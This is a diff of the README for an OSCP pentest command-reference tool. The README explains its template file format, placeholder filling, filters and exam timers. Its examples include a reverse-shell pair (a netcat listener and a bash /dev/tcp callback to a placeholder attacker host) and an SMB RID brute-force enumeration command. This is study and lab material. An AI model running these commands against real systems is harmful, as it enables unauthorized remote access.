@@ -1,166 +1,388 @@
 
 # OSCP Command Generator
 
-A lightweight, offline-friendly command template browser + generator for
-OSCP/pen-test workflows.
+A lightweight **offline command reference and generator** designed for **OSCP / penetration testing workflows**.
 
-- Load commands from simple `.txt` files in `/data`
-- Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the left sidebar
-- Search instantly without re-render flicker (DOM hide/show filtering)
-- Filter by **Credential**, **Non-credential**, **Priority**, and **Favorites**
-- Copy full commands (or individual steps) with one click
-- Highlight placeholders, flags, operators, and `#comments` (but not numbering like `#2`)
-- NEW: **Exam timer helpers** (20 / 40 / 90 mins) with **visual-only** alerts (no sound, no popups)
-- NEW: **Jump to category with hits** during global search
+The tool loads command templates from simple `.txt` files and allows you to:
 
-------------------------------------------------------------------------
+- Quickly **search and filter commands**
+- **Fill placeholders** such as `<target>`, `<user>`, `<password>`
+- Copy commands with **one-click clipboard support**
+- Group **multi‑step commands automatically**
+- Highlight **flags, placeholders, and comments**
+- Track **priority commands** during an exam
+- Filter commands by **credential usage**, **favorites**, and **priority**
+- Use **visual exam timers** (20 / 40 / 90 minutes)
 
-## Project Structure
+The entire tool runs **client-side only**, meaning:
 
-oscp-command-generator/
-├─ index.html
-├─ css/
-│  └─ style.css
-├─ js/
-│  └─ (modular JS files)
-├─ data/
-│  ├─ 01_Network_Enumeration.txt
-│  ├─ 02_Web_Enumeration_and_attacks.txt
-│  ├─ ...
-│  └─ manifest.json
-└─ README.md
+- No backend required
+- Works **offline**
+- Can be hosted locally or on GitHub Pages
 
-------------------------------------------------------------------------
+---
 
-## Getting Started
+# Functional Requirements
 
-### Python
+The application provides the following functionality.
 
-python -m http.server 8000
+## 1. Command Loading
 
-Open:
+Commands are loaded dynamically from text files located in:
 
-http://localhost:8000/
+```
+/data/
+```
 
-### Node
+A manifest file (`manifest.json`) defines which command files should be loaded.
 
-npx http-server -p 8000
-
-------------------------------------------------------------------------
-
-## Command File Format
-
-Each non-empty line represents one command entry:
-
-Header: command with <tags> # comment (what this does / what to look for); kali-machine|target-machine
+Each file represents a **category of commands**.
 
 Example:
 
+```
+01_Network_Enumeration.txt
+02_Web_Enumeration_and_attacks.txt
+03_Database_enum.txt
+...
+```
+
+---
+
+## 2. Command Parsing
+
+Each line in the `.txt` file represents a command entry.
+
+Format:
+
+```
+Title: command <placeholders> # explanation; where-it-runs
+```
+
+Example:
+
+```
 RID Brute: nxc smb <target> -u '' -p '' --rid-brute # enumerate domain users/groups via RID brute-force; kali-machine
+```
 
-------------------------------------------------------------------------
+Parsing rules:
 
-## Priority Commands
+| Component | Description |
+|----------|-------------|
+Title | Text before the first `:` |
+Command | Everything after the first `:` |
+Comment | Explanation after `#` |
+Execution Context | `; kali-machine` or `; target-machine` |
+Placeholders | `<target>`, `<domain>`, `<user>` etc |
 
-Prefix a command with ^
+---
 
-^Nmap quick scan: nmap -sC -sV <target>
+## 3. Multi-Step Commands
 
-------------------------------------------------------------------------
+Commands with the **same title** are automatically grouped into a **single command card**.
 
-## Multi-step Commands
+Example:
 
-Repeated headers are grouped automatically:
-
+```
 Reverse shell: nc -lvnp <kaliPort>
-Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1
+Reverse shell: bash -i >& /dev/tcp/<kaliIP>/<kaliPort> 0>&1
+```
 
-------------------------------------------------------------------------
+Result:
 
-## Placeholders
+```
+Reverse shell
+1. nc -lvnp <kaliPort>
+2. bash -i >& /dev/tcp/<kaliIP>/<kaliPort> 0>&1
+```
 
-Supported placeholders:
+---
 
+## 4. Priority Commands
+
+Commands that start with `^` are treated as **priority commands**.
+
+Example:
+
+```
+^Quick scan: nmap -sC -sV <target>
+```
+
+Priority commands:
+
+- Appear **at the top of results**
+- Are useful for **exam critical commands**
+
+---
+
+## 5. Placeholder Injection
+
+The sidebar allows users to define values for placeholders.
+
+Example placeholders:
+
+```
 <target>
-<target6>
-<port>
-<kali>
-<kali6>
-<kaliPort>
+<domain>
 <user>
 <password>
-<domain>
 <dc-ip>
-<ntlm>
-<filename1>
-<filename2>
-<wordlist1>
-<wordlist2>
+<kali-ip>
+```
 
-------------------------------------------------------------------------
+When a value is entered:
 
-## Search
+```
+nmap -sC -sV <target>
+```
 
-Local search filters commands inside the current category.
+becomes:
 
-Global search lists matching categories under **Found in:**
+```
+nmap -sC -sV 10.10.10.10
+```
 
-Clicking a category jumps directly to that category while keeping the search term.
+---
 
-------------------------------------------------------------------------
+## 6. Search System
 
-## Favorites
+The search system performs **instant filtering** without re-rendering the DOM.
 
-Click ☆ / ★ to favorite commands.
-Favorites are stored in localStorage.
+Search matches:
 
-------------------------------------------------------------------------
+- Command text
+- Titles
+- Comments
 
-## Exam Timer Helpers
+This enables extremely fast filtering even with large command sets.
 
-Toolbar timers:
+---
 
-20 / 40 / 90 minute timers
+## 7. Command Filters
 
-Stop button cancels the timer.
+Users can filter commands by:
 
-Alerts are visual only:
+### Credential Commands
 
-- flashing red timer
-- flashing browser tab attention
+Commands that require credentials.
 
-Active timer button style:
+Example:
 
-- dark red tint
-- bold red outline
+```
+-u <user> -p <password>
+```
 
-Pressing Stop resets the button style.
+### Non-Credential Commands
 
-------------------------------------------------------------------------
+Commands that can be run **without credentials**.
 
-## Exam Controls
+### Priority Commands
 
-Block Copy:
-Prevents copying commands if required tags are missing.
+Show only commands marked with `^`.
 
-Remember Non-sensitive Inputs:
-Stores IPs, ports, filenames and wordlists in localStorage.
-Passwords are never stored.
+### Favorites
 
-------------------------------------------------------------------------
+Users can mark commands as favorites for quick access.
 
-## Keyboard Shortcuts
+Favorites are stored in **local browser storage**.
 
-/ → focus search
-j / k → move selection
-c → copy selected command
-Ctrl + + / - / 0 → adjust font size
-Esc → close help
+---
 
-------------------------------------------------------------------------
+## 8. Syntax Highlighting
 
-## Notes
+Commands are visually highlighted to improve readability.
 
-- Must be served via HTTP
-- Fully static project
-- Works offline once loaded
+Highlight types:
+
+| Element | Example |
+|-------|--------|
+Placeholder | `<target>` |
+Flags | `-sC` |
+Operators | `|`, `>`, `&&` |
+Comments | `# explanation` |
+
+Numbered steps like `#2` are **not treated as comments**.
+
+---
+
+## 9. Clipboard Support
+
+Each command supports:
+
+- Copy **entire command**
+- Copy **individual step**
+
+This allows fast command usage during labs or exams.
+
+---
+
+## 10. Exam Timers
+
+Built-in timers for:
+
+```
+20 minutes
+40 minutes
+90 minutes
+```
+
+Timers are:
+
+- Visual only
+- No sound alerts
+- Designed to support **OSCP exam pacing**
+
+---
+
+# Project Structure
+
+```
+OSCP_Command_Generator/
+│
+├── index.html
+│
+├── css/
+│   └── style.css
+│
+├── js/
+│   ├── main.js
+│   ├── parse.js
+│   ├── render.js
+│   ├── filters.js
+│   ├── events.js
+│   ├── storage.js
+│   ├── state.js
+│   └── (other modular utilities)
+│
+├── data/
+│   ├── 01_Network_Enumeration.txt
+│   ├── 02_Web_Enumeration_and_attacks.txt
+│   ├── 03_Database_enum.txt
+│   ├── 04_File_transfer.txt
+│   ├── 05_Password_attacks.txt
+│   ├── 06_Shells_wordlists.txt
+│   ├── 07_Linux_enum_privesc.txt
+│   ├── 08_Windows_enum_privesc.txt
+│   ├── 09_Tunneling_Port_forwarding.txt
+│   ├── 10_Windows_AD.txt
+│   ├── 11_Misc.txt
+│   └── manifest.json
+│
+└── README.md
+```
+
+---
+
+# Adding New Commands
+
+Commands are added by editing the `.txt` files in the `/data` directory.
+
+Example entry:
+
+```
+Nmap full scan: nmap -p- -sC -sV <target> # full TCP scan with service detection; kali-machine
+```
+
+Best practices:
+
+- Keep commands **one per line**
+- Use **clear titles**
+- Include **useful comments**
+- Specify **where the command runs**
+
+---
+
+# Creating a New Command Category
+
+1. Create a new `.txt` file inside:
+
+```
+/data/
+```
+
+Example:
+
+```
+12_Kerberos.txt
+```
+
+2. Add it to the manifest file:
+
+```
+data/manifest.json
+```
+
+Example:
+
+```json
+{
+  "files": [
+    "01_Network_Enumeration.txt",
+    "02_Web_Enumeration_and_attacks.txt",
+    "12_Kerberos.txt"
+  ]
+}
+```
+
+3. Reload the application.
+
+The new category will automatically appear.
+
+---
+
+# Running the Project
+
+Since the project loads files via `fetch`, it must be served via HTTP.
+
+## Python
+
+```
+python -m http.server 8000
+```
+
+Open:
+
+```
+http://localhost:8000
+```
+
+---
+
+## Node
+
+```
+npx http-server -p 8000
+```
+
+---
+
+# Design Philosophy
+
+This project was designed with the following principles:
+
+- **Exam speed over aesthetics**
+- **Offline first**
+- **Minimal dependencies**
+- **Fast DOM filtering**
+- **Easy command editing via text files**
+
+The goal is to provide a **rapid command lookup system during penetration testing labs and exams**.
+
+---
+
+# Future Improvements
+
+Potential enhancements:
+
+- Command export
+- Markdown command import
+- Dark / light theme toggle
+- Placeholder profiles
+- Auto-detection of credential commands
+- OSCP exam workflow presets
+
+---
+
+# License
+
+Personal project for OSCP study and penetration testing workflow optimization.
